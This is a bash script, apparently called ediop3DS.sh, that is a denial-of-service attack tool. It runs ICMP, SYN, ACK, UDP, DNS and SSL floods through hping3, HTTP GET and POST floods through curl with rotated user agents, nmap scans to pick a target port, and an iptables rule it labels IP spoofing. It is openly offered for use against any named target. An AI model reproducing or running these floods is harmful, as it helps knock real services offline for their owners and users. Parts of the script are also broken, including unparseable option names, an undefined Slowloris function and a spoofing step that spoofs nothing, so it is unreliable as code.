#!/bin/bash

RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[34m"
CYAN="\e[36m"
WHITE="\e[97m"
RESET="\e[0m"

port=80
num_requests=1000
pSize=56
P=0.01
proto="TCP"
verbose=0

display_logo() {
    echo -e "${CYAN}"
    echo -e """
███████╗██████╗░██╗░█████╗░██████╗░██████╗░
██╔════╝██╔══██╗██║██╔══██╗██╔══██╗╚════██╗
█████╗░░██║░░██║██║██║░░██║██████╔╝░█████╔╝
██╔══╝░░██║░░██║██║██║░░██║██╔═══╝░░╚═══██╗
███████╗██████╔╝██║╚█████╔╝██║░░░░░██████╔╝
╚══════╝╚═════╝░╚═╝░╚════╝░╚═╝░░░░░╚═════╝░
"""
    echo -e "${RESET}"
}

show_help() {
    display_logo
    echo -e "\nUsage: ./ediop3DS.sh -u target_ip_or_url -p port [options]\n"
    echo -e "${YELLOW}Options:${RESET}"
    echo -e "  -u       Target IP or URL (required)"
    echo -e "  -p       Target Port (default: 80)"
    echo -e "  -h       Show this help message"
    echo -e "  -r       Retry attack without port if no open ports are found"
    echo -e "  -i       Send ICMP ping flood"
    echo -e "  -S       Send TCP SYN flood"
    echo -e "  -A       Send TCP ACK flood"
    echo -e "  -U       Send UDP flood"
    echo -e "  -f IP    Spoof source IP"
    echo -e "  -n NUM   Number of requests (default: 1000)"
    echo -e "  -H HDR   Custom HTTP headers"
    echo -e "  -pSize   Packet size (default: 56)"
    echo -e "  -proto   Protocol (TCP, UDP, ICMP, RAW-IP)"
    echo -e "  -P DELAY Packet delay in seconds (default: 0.01)"
    echo -e "  -l       Slowloris attack"
    echo -e "  -F       Test firewall"
    echo -e "  -I       DNS flood"
    echo -e "  -T       HTTP GET flood"
    echo -e "  -L       HTTP POST flood"
    echo -e "  -V       SSL DDoS"
    echo -e "  -M       Custom TCP packet flood"
}

scan_ports() {
    target=$1
    echo -e "${CYAN}[*] Scanning for open ports on $target${RESET}"
    open_ports=$(nmap -p- --min-rate=5000 -T4 $target | grep 'open' | awk -F '/' '{print $1}')
    if [ -z "$open_ports" ]; then
        echo -e "${RED}[!] No open ports found.${RESET}"
        return 1
    else
        echo -e "${GREEN}[+] Open ports: $open_ports${RESET}"
        port=$(echo "$open_ports" | head -n 1)
    fi
}

read_user_agents() {
    if [ -f "user_agents.txt" ]; then
        mapfile -t user_agents < user_agents.txt
    else
        echo -e "${RED}[!] user_agents.txt not found!${RESET}"
        exit 1
    fi
}

retry_attack() {
    target=$1
    attack_type="$2"
    attack_func="${attack_type}_flood"
    if [ -z "$port" ]; then
        echo -e "${YELLOW}[+] No open ports found, using default port: $port${RESET}"
        port=80
    fi
    $attack_func $target
}

spoof_ip() {
    ip=$1
    echo -e "${CYAN}[*] Spoofing source IP address: $ip${RESET}"
    iptables -t nat -A POSTROUTING -s $ip -j MASQUERADE
}

custom_headers() {
    header=$1
    echo -e "${CYAN}[*] Using custom HTTP header: $header${RESET}"
    curl -s -X GET http://$target -H "$header" > /dev/null 2>&1
}

icmp_flood() {
    target=$1
    echo -e "${CYAN}[*] ICMP flood on $target using $proto${RESET}"
    read_user_agents
    for ((i=0; i<$num_requests; i++)); do
        ua=${user_agents[$RANDOM % ${#user_agents[@]}]}
        [[ $proto == "ICMP" ]] && hping3 --icmp -p $port --data $pSize $target > /dev/null 2>&1 &
        [ "$verbose" == "1" ] && echo -e "${CYAN}[+] Sending ICMP request $i${RESET}"
        sleep $P
    done
    wait
}

syn_flood() {
    target=$1
    echo -e "${CYAN}[*] TCP SYN flood on $target${RESET}"
    read_user_agents
    for ((i=0; i<$num_requests; i++)); do
        ua=${user_agents[$RANDOM % ${#user_agents[@]}]}
        [[ $proto == "TCP" ]] && hping3 --syn -p $port --data $pSize $target > /dev/null 2>&1 &
        [ "$verbose" == "1" ] && echo -e "${CYAN}[+] Sending SYN request $i${RESET}"
        sleep $P
    done
    wait
}

ack_flood() {
    target=$1
    echo -e "${CYAN}[*] TCP ACK flood on $target${RESET}"
    read_user_agents
    for ((i=0; i<$num_requests; i++)); do
        ua=${user_agents[$RANDOM % ${#user_agents[@]}]}
        [[ $proto == "TCP" ]] && hping3 --ack -p $port --data $pSize $target > /dev/null 2>&1 &
        [ "$verbose" == "1" ] && echo -e "${CYAN}[+] Sending ACK request $i${RESET}"
        sleep $P
    done
    wait
}

udp_flood() {
    target=$1
    echo -e "${CYAN}[*] UDP flood on $target${RESET}"
    read_user_agents
    for ((i=0; i<$num_requests; i++)); do
        ua=${user_agents[$RANDOM % ${#user_agents[@]}]}
        [[ $proto == "UDP" ]] && hping3 --udp -p $port --data $pSize $target > /dev/null 2>&1 &
        [ "$verbose" == "1" ] && echo -e "${CYAN}[+] Sending UDP request $i${RESET}"
        sleep $P
    done
    wait
}

dns_flood() {
    target=$1
    echo -e "${CYAN}[*] DNS flood on $target${RESET}"
    read_user_agents
    for ((i=0; i<$num_requests; i++)); do
        ua=${user_agents[$RANDOM % ${#user_agents[@]}]}
        [[ $proto == "UDP" ]] && hping3 --udp -p 53 --data $pSize $target > /dev/null 2>&1 &
        [ "$verbose" == "1" ] && echo -e "${CYAN}[+] Sending DNS request $i${RESET}"
        sleep $P
    done
    wait
}

test_firewall() {
    target=$1
    echo -e "${CYAN}[*] Testing firewall on $target${RESET}"
    nmap -p $port $target
}

ssl_ddos() {
    target=$1
    echo -e "${CYAN}[*] SSL DDoS on $target${RESET}"
    read_user_agents
    for ((i=0; i<$num_requests; i++)); do
        ua=${user_agents[$RANDOM % ${#user_agents[@]}]}
        hping3 --tcp --syn -S -p 443 --data $pSize $target > /dev/null 2>&1 &
        [ "$verbose" == "1" ] && echo -e "${CYAN}[+] Sending SSL request $i${RESET}"
        sleep $P
    done
    wait
}

custom_tcp_flood() {
    target=$1
    echo -e "${CYAN}[*] Custom TCP flood on $target${RESET}"
    read_user_agents
    for ((i=0; i<$num_requests; i++)); do
        ua=${user_agents[$RANDOM % ${#user_agents[@]}]}
        hping3 --syn -p $port --data $pSize $target > /dev/null 2>&1 &
        [ "$verbose" == "1" ] && echo -e "${CYAN}[+] Sending custom TCP request $i${RESET}"
        sleep $P
    done
    wait
}

http_flood() {
    target=$1
    echo -e "${CYAN}[*] HTTP GET flood on $target${RESET}"
    read_user_agents
    for ((i=0; i<$num_requests; i++)); do
        ua=${user_agents[$RANDOM % ${#user_agents[@]}]}
        curl -s -X GET http://$target -H "User-Agent: $ua" > /dev/null 2>&1 &
        [ "$verbose" == "1" ] && echo -e "${CYAN}[+] Sending GET request $i${RESET}"
        sleep $P
    done
    wait
}

post_flood() {
    target=$1
    echo -e "${CYAN}[*] HTTP POST flood on $target${RESET}"
    read_user_agents
    for ((i=0; i<$num_requests; i++)); do
        ua=${user_agents[$RANDOM % ${#user_agents[@]}]}
        curl -s -X POST http://$target --data "payload" -H "User-Agent: $ua" > /dev/null 2>&1 &
        [ "$verbose" == "1" ] && echo -e "${CYAN}[+] Sending POST request $i${RESET}"
        sleep $P
    done
    wait
}

while getopts ":u:p:sirSAtf:n:Hvl:t:FITLVMpSize:proto:P:" option; do
    case $option in
        u) target="$OPTARG";;
        p) port="$OPTARG";;
        s) scan_ports "$target";;
        i) icmp_flood "$target";;
        r) retry_attack "$target" "$attack_type";;
        S) syn_flood "$target";;
        A) ack_flood "$target";;
        U) udp_flood "$target";;
        f) spoof_ip "$OPTARG";;
        n) num_requests="$OPTARG";;
        H) custom_headers "$OPTARG";;
        v) verbose=1;;
        l) check_and_run_slowloris "$target";;
        t) attack_type="$OPTARG";;
        F) test_firewall "$target";;
        I) dns_flood "$target";;
        T) http_flood "$target";;
        L) post_flood "$target";;
        M) custom_tcp_flood "$target";;
        V) ssl_ddos "$target";;
        pSize) pSize="$OPTARG";;
        proto) proto="$OPTARG";;
        P) P="$OPTARG";;
        h) show_help; exit;;
        *) show_help; exit 1;;
    esac
done
